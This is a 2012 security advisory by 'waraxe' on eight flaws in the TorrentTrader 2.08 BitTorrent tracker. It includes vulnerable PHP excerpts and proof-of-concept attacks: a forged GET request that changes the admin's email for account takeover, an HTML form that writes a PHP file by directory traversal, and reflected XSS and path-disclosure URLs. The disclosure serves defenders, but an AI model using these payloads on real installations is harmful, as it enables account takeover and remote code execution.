@@ -1,0 +1,263 @@
+[waraxe-2012-SA#089] - Multiple Vulnerabilities in TorrentTrader 2.08
+===============================================================================
+
+Author: Janek Vind "waraxe"
+Date: 17. September 2012
+Location: Estonia, Tartu
+Web: http://www.waraxe.us/advisory-89.html
+
+
+Description of vulnerable software:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+TorrentTrader is a feature packed and highly customisable PHP/MySQL Based BitTorrent
+tracker. Featuring integrated forums, and plenty of administration options.
+
+http://sourceforge.net/projects/torrenttrader/
+http://www.torrenttrader.org/topic/14292-torrenttrader-v208-released/
+
+###############################################################################
+1. Unauthorized Email Change in "account-ce.php"
+###############################################################################
+
+Reason: authorization bypass
+Attack vector: user submitted GET parameters "id", "secret" and "email"
+Preconditions: none
+Result: attacker can change any user's email, including admin's
+
+-----------------[ source code start ]---------------------------------
+$id = (int) $_GET["id"];
+$md5 = $_GET["secret"];
+$email = $_GET["email"];
+..
+$res = SQL_Query_exec("SELECT `editsecret` FROM `users` 
+WHERE `enabled` = 'yes' AND `status` = 'confirmed' AND `id` = '$id'");
+
+$row = mysql_fetch_assoc($res);
+..
+$sec = $row["editsecret"];
+
+if ($md5 != md5($sec . $email . $sec))
+  show_error_msg(T_("ERROR"), T_("NOTHING_FOUND"), 1);
+
+SQL_Query_exec("UPDATE `users` SET `editsecret` = '', `email` = ".sqlesc($email)."
+WHERE `id` = '$id' AND `editsecret` = " . sqlesc($row["editsecret"]));
+-----------------[ source code end ]-----------------------------------
+
+Tests:
+
+Let's find md5 hash of email "test@test.com", which is "b642b4217b34b1e8d3bd915fc65c4452".
+Target user ID is 1. We issue GET request:
+
+http://localhost/torrenttrader208/account-ce.php?id=1&
+secret=b642b4217b34b1e8d3bd915fc65c4452&email=test@test.com
+
+Quick look to the database confirms, that email address of user with ID 1
+has been changed indeed. 
+
+Next logical move for attacker is password recovery request:
+
+http://localhost/torrenttrader208/account-recover.php
+
+After admin account takeover attacker is able to use next vulnerability,
+described below, which may allow php remote code execution.
+
+###############################################################################
+2. Arbitrary file creation / directory traversal in "nfo-edit.php"
+###############################################################################
+
+Reason: failure to properly sanitize user submitted data
+Attack vector: user submitted POST parameters "id" and "content"
+Preconditions:
+ 1. nfo-file editing privileges needed (usually admin)
+ 2. PHP must be < 5.3.4 for null-byte attacks to work
+Result:
+  1. attacker is able to write remote files with arbitrary content
+  2. directory traversal vulnerability allows bypassing path restrictions
+
+
+-----------------[ source code start ]---------------------------------
+$id = (int)$_GET["id"]?$_GET["id"]:$_POST["id"]; 
+$do = $_POST["do"];
+  
+$nfo = $site_config["nfo_dir"] . "/$id.nfo";
+  
+if ($do == "update") { 
+  if (file_put_contents($nfo, $_POST["content"]))  
+  {
+    write_log("NFO ($id) was updated by $CURUSER[username].");
+-----------------[ source code end ]-----------------------------------
+  
+Test: first we need html form like the one below:
+
+<html><body><center>
+<form action="http://localhost/torrenttrader208/nfo-edit.php"
+method="post" enctype="multipart/form-data">
+<input type="hidden" name="do" value="update">
+<input type="hidden" name="id" value="test.php">
+<input type="hidden" name="content" value="<?php phpinfo();?>">
+<input type="submit" value="Test">
+</form></center></body></html>
+
+
+Log in as admin and then make POST request by cliking "Test" button.
+We should see "NFO Updated" as response and can confirm new file existence:
+
+http://localhost/torrenttrader208/uploads/test.php.nfo
+
+By using null byte ("\0") it's possible writing files with arbitrary extension.
+Finally, it is possible to make use of directory traversal strings "../"
+and write files to arbitrary location in remote server.
+
+###############################################################################
+3. Username Enumeration Vulnerability in "account-login.php"
+###############################################################################
+
+Reason: different error messages for invalid username and invalid password
+Attack vector: user submitted POST parameters "username" and "password"
+Preconditions: none
+Result: attacker can enumerate valid usernames
+
+-----------------[ source code start ]---------------------------------
+if (!empty($_POST["username"]) && !empty($_POST["password"])) {
+  $res = SQL_Query_exec("SELECT id, password, secret, status, enabled FROM users
+  WHERE username = " . sqlesc($_POST["username"]) . "");
+  $row = mysql_fetch_array($res);
+
+  if (!$row)
+    $message = T_("USERNAME_INCORRECT");
+  elseif ($row["status"] == "pending")
+    $message = T_("ACCOUNT_PENDING");
+  elseif ($row["password"] != $password)
+    $message = T_("PASSWORD_INCORRECT");
+-----------------[ source code end ]-----------------------------------
+
+Tests:
+
+Try to log in with nonexistent username:
+
+"Username Incorrect"
+
+Next, try valid username with incorrect password:
+
+"Password Incorrect"
+
+So it's obvious, that attacker is able to distinguish between valid and
+invalid usernames and therefore username enumeration vulnerability exists.
+
+
+###############################################################################
+4. Reflected XSS in "faq.php"
+###############################################################################
+Preconditions: "register_globals=on"
+Attack Vector: User provided parameter "faq_categ"
+ 
+http://localhost/torrenttrader208/faq.php?faq_categ[0][title]=
+<script>alert(String.fromCharCode(88,83,83))</script>&faq_categ[0][flag]=1
+&faq_categ[0][items][0][question]=aa&faq_categ[0][items][0][answer]=bb
+&faq_categ[0][items][0][flag]=1
+
+http://localhost/torrenttrader208/faq.php?faq_categ[0][title]=test&faq_categ[0][flag]=1
+&faq_categ[0][items][0][question]=<script>alert(String.fromCharCode(88,83,83))</script>
+&faq_categ[0][items][0][answer]=bb&faq_categ[0][items][0][flag]=1
+
+http://localhost/torrenttrader208/faq.php?faq_categ[0][title]=test&faq_categ[0][flag]=1
+&faq_categ[0][items][0][question]=test&faq_categ[0][items][0][answer]=
+<script>alert(String.fromCharCode(88,83,83))</script>&faq_categ[0][items][0][flag]=1
+
+
+###############################################################################
+5. Reflected XSS in "account-signup.php"
+###############################################################################
+Preconditions: "register_globals=on"
+Attack Vector: User provided parameters "invite" and "secret"
+
+http://localhost/torrenttrader208/account-signup.php?invite_row=1
+&invite="><script>alert(String.fromCharCode(88,83,83))</script>
+
+http://localhost/torrenttrader208/account-signup.php?invite_row=1
+&secret="><script>alert(String.fromCharCode(88,83,83))</script>
+
+
+###############################################################################
+6. Reflected XSS in "/themes/default/header.php"
+###############################################################################
+Preconditions: "register_globals=on"
+Attack Vector: User provided parameters "title" and "site_config"
+
+http://localhost/torrenttrader208/themes/default/header.php?
+title=</title><script>alert(String.fromCharCode(88,83,83))</script>
+
+http://localhost/torrenttrader208/themes/default/header.php?
+site_config[CHARSET]="><script>alert(String.fromCharCode(88,83,83))</script>
+
+http://localhost/torrenttrader208/themes/default/header.php?
+site_config[SITEURL]=--><script>alert(String.fromCharCode(88,83,83))</script>
+
+
+###############################################################################
+7. Reflected XSS in "/themes/NB-Clean/header.php"
+###############################################################################
+Preconditions: "register_globals=on"
+Attack Vector: User provided parameters "title" and "site_config"
+
+http://localhost/torrenttrader208/themes/NB-Clean/header.php?
+title=</title><script>alert(String.fromCharCode(88,83,83))</script>
+
+http://localhost/torrenttrader208/themes/NB-Clean/header.php?
+site_config[CHARSET]="><script>alert(String.fromCharCode(88,83,83))</script>
+
+http://localhost/torrenttrader208/themes/NB-Clean/header.php?
+site_config[SITEURL]="><script>alert(String.fromCharCode(88,83,83))</script>
+
+
+###############################################################################
+8. Path Disclosure vulnerability in multiple scripts
+###############################################################################
+
+http://localhost/torrenttrader208/account-login.php?returnto[]
+
+Warning: htmlspecialchars() expects parameter 1 to be string, array given in
+C:/apache_www/torrenttrader208/account-login.php on line 72
+
+http://localhost/torrenttrader208/themes/default/footer.php
+
+Fatal error: Call to undefined function T_() in
+C:/apache_www/torrenttrader208/themes/default/footer.php on line 26
+
+http://localhost/torrenttrader208/themes/default/header.php
+
+Fatal error: Call to undefined function T_() in
+C:/apache_www/torrenttrader208/themes/default/header.php on line 28
+
+http://localhost/torrenttrader208/themes/NB-Clean/footer.php
+
+Fatal error: Call to undefined function T_() in
+C:/apache_www/torrenttrader208/themes/NB-Clean/footer.php on line 22
+
+http://localhost/torrenttrader208/faq.php?faq_categ=1
+
+Fatal error: Cannot use string offset as an array in
+C:/apache_www/torrenttrader208/faq.php on line 17
+
+http://localhost/torrenttrader208/rss.php?cat[]
+
+Warning: explode() expects parameter 2 to be string, array given in
+C:\apache_www\torrenttrader208\rss.php on line 119
+
+http://localhost/torrenttrader208/backend/smilies.php?action=display&form[]
+
+Warning: htmlspecialchars() expects parameter 1 to be string, array given in
+C:\apache_www\torrenttrader208\backend\smilies.php on line 50
+
+
+Contact:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+come2waraxe@yahoo.com
+Janek Vind "waraxe"
+
+Waraxe forum:  http://www.waraxe.us/forums.html
+Personal homepage: http://www.janekvind.com/
+Random project: http://albumnow.com/
+---------------------------------- [ EOF ] ------------------------------------
